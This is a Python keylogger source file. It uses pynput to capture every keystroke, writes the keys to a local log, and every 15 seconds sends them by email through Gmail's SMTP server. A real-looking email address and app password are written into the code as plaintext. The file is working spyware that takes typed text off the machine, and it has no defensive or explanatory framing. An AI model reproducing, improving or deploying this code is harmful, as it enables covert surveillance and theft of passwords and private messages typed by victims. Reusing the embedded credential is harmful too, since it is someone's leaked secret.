import logging
import os
import threading
from datetime import datetime
from datetime import datetime
import smtplib
import threading
from pynput import keyboard

# Configure logging 
log_file = "keylog.txt"
logging.basicConfig(
    filename = log_file,
    level = logging.INFO,
    format = '%(asctime)s - %(message)s',
    encoding = 'utf-8'
)

# Global variables
# Global variables
log_file = "keylog.txt"
logged_keys = ""
email_address = "prakashwijesinghanew@gmail.com"
password = "fner adgz ooqy jmps"
time_interval = 15 # Send email every 15 seconds
timer = None

def on_press(key):
    """Handle key press events"""
    global logged_keys
    try:
        current_key = ""
        # Check for space key directly to log as " "
        if key == keyboard.Key.space:
            current_key = " "
        # Log alphanumeric keys
        elif hasattr(key, 'char') and key.char is not None:
            current_key = str(key.char)
        else:
            # Log special keys (Ctrl, Alt, etc.)
            key_name = getattr(key, 'name', str(key))
            current_key = " [" + key_name + "] "
        
        logging.info(current_key.strip())
        logged_keys += current_key
            
    except Exception as e:
        logging.error(f"Error logging key: {e}")

def on_release(key):
    """Handle key release events"""
    global timer, logged_keys
    # Stop listener when Esc is pressed
    if key == keyboard.Key.esc:
        if timer:
            timer.cancel()
        # Send remaining keys
        if logged_keys:
             send_mail(email_address, password, logged_keys)
        return False

def send_mail(email, password, message):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()
        print("Email sent!")
    except Exception as e:
        print(f"Error sending email: {e}")

def report():
    global logged_keys, timer
    if logged_keys:
        send_mail(email_address, password, logged_keys)
        logged_keys = ""
    
    timer = threading.Timer(time_interval, report)
    timer.start()

def start_keylogger():
    """Start the keylogger"""
    print("Keylogger started. Press 'Esc' to stop.")
    
    # Start the reporting timer
    report()

    # Create a listener
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()



    
